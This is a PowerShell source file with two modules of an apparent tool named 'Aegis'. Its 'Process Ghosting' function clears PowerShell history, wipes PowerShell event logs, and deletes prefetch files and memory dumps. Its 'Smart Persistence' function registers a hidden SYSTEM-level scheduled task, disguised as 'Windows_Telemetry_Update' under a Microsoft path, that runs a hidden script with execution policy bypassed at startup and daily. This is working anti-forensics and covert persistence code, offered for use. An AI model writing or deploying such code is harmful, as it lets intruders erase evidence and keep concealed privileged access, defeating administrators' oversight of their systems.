#region Process Ghosting & Smart Persistence Modules
# MinOz GHOST PROTOCOL (2026)
# Module 4: Process Ghosting
# Module 5: Smart Persistence

function Invoke-ProcessGhosting {
    [CmdletBinding()]
    param()
    
    Write-AegisLog -Level "INFO" -Message "[GHOST] Initiating Process Ghosting Protocol..."
    
    try {
        # 1. Clear PowerShell command history
        Clear-History -ErrorAction SilentlyContinue
        try {
            $histPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
            if ($histPath -and (Test-Path $histPath)) {
                Remove-Item $histPath -Force -ErrorAction SilentlyContinue
            }
        } catch {}
        
        # 2. Clear PowerShell event logs only (ไม่ touch WMI/system logs)
        $logsToClear = @("Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
        foreach ($log in $logsToClear) {
            try { wevtutil.exe cl "$log" 2>&1 | Out-Null } catch {}
        }
        
        # 3. Clear PowerShell prefetch only
        $prefetchPath = "$env:SystemRoot\Prefetch"
        if (Test-Path $prefetchPath) {
            Get-ChildItem -Path $prefetchPath -Filter "POWERSHELL*.pf" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        # 4. Clear memory dumps
        foreach ($path in @($env:TEMP, "$env:SystemRoot\Temp")) {
            if (Test-Path $path) {
                Get-ChildItem -Path $path -Filter "*.dmp" -ErrorAction SilentlyContinue |
                    Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-AegisLog -Level "INFO" -Message "[GHOST] Process Ghosting complete"
        return @{ Success = $true }
    }
    catch {
        Write-AegisLog -Level "WARN" -Message "[GHOST] Process Ghosting partial: $($_.Exception.Message)"
        return @{ Success = $false }
    }
}

function Invoke-SmartPersistence {
    [CmdletBinding()]
    param(
        # Identity เป็น Optional ไม่ Mandatory
        [Parameter(Mandatory = $false)]
        [hashtable]$Identity = @{},
        
        [switch]$Enable,
        [switch]$Disable
    )
    
    Write-AegisLog -Level "INFO" -Message "[GHOST] Initiating Smart Persistence Protocol..."
    
    $taskName = "Windows_Telemetry_Update"
    $taskPath = "\Microsoft\Windows\Application Experience"
    
    try {
        if ($Enable) {
            $scriptRoot = if ($script:AegisRoot) { $script:AegisRoot } else { $PSScriptRoot + "\.." }
            $mainScript = Join-Path $scriptRoot "Aegis.ps1"
            
            $action   = New-ScheduledTaskAction -Execute "PowerShell.exe" `
                            -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$mainScript`""
            $trigger1 = New-ScheduledTaskTrigger -AtStartup
            $trigger2 = New-ScheduledTaskTrigger -Daily -At "03:00AM"
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
                            -DontStopIfGoingOnBatteries -StartWhenAvailable
            
            $task = New-ScheduledTask -Action $action -Trigger @($trigger1, $trigger2) `
                        -Principal $principal -Settings $settings
            Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath `
                -InputObject $task -Force -ErrorAction Stop | Out-Null
            
            Write-AegisLog -Level "INFO" -Message "[GHOST] Smart Persistence enabled: $taskName"
            return @{ Success = $true; Enabled = $true }
        }
        elseif ($Disable) {
            Unregister-ScheduledTask -TaskName $taskName -TaskPath $taskPath `
                -Confirm:$false -ErrorAction SilentlyContinue
            Write-AegisLog -Level "INFO" -Message "[GHOST] Smart Persistence disabled"
            return @{ Success = $true; Enabled = $false }
        }
        else {
            Write-AegisLog -Level "WARN" -Message "[GHOST] Smart Persistence: no action specified"
            return @{ Success = $false }
        }
    }
    catch {
        Write-AegisLog -Level "WARN" -Message "[GHOST] Smart Persistence failed: $($_.Exception.Message)"
        return @{ Success = $false }
    }
}

#endregion
